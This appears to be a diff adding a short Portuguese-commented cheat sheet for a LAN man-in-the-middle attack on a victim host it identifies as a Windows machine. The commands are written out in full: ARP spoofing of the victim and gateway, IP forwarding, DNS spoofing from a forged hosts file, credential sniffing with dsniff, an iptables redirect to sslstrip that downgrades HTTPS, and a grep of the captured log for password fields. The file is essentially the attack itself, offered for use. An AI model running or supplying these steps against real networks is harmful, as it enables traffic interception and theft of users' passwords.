@@ -1,0 +1,50 @@
+/*ve se o ping ta chegando*/
+tcpdump -i eth0 host 192.168.0.126 
+
+/*aqui mente para a vitima que vc é o servidor
+o ping da vitima deve dar como perdido.*/
+arpspoof -i eth0  -t 192.168.0.126 192.168.0.2
+
+/*Ativar o ip_forward para redirecionar o tráfego.*/
+root@kali:~# echo “1” > /proc/sys/net/ipv4/ip_forward
+
+/*criar um arquivo de resposta a vitima ex google.com é 127.0.0.1
+vi hosts.txt*/
+
+Q*escuta e mente o dns obs o arpspoof deve estar rodando*/
+dnsspoof -i eth0 -f hosts.txt
+
+/*escuta protocolos conhecidos :)*/
+dsniff -i eth0
+
+/*Crie a regra de redirecionamento no iptables da porta 80 para a porta 8080*/
+
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
+
+/*Execute o SSLSTRIP com as opções -a -l*/
+
+sslstrip -a -l 8080
+
+/*
+-a : Acessa todo tráfego HTTP e SSL DE e PARA o Servidor
+
+-l 8080 : Define a porta de escuta (listen)  – Porta Padrão (10000)
+*/
+
+
+/*Abra um novo Console e execute o ARPSPOOF*/
+
+arpspoof -i eth0  -t 192.168.0.126 192.168.0.2
+
+/*
+-i eth0: Interface de Rede
+
+-t: Define o Host Alvo
+
+192.168.0.126 : IP da Vítima ( WIN-7,8,10.. )
+
+192.168.0.2: Gateway da Rede
+*/
+
+/*Um arquivo de nome sslstrip.log é criado contendo todo tráfego capturado.*/
+cat sslstrip.log | grep senha=
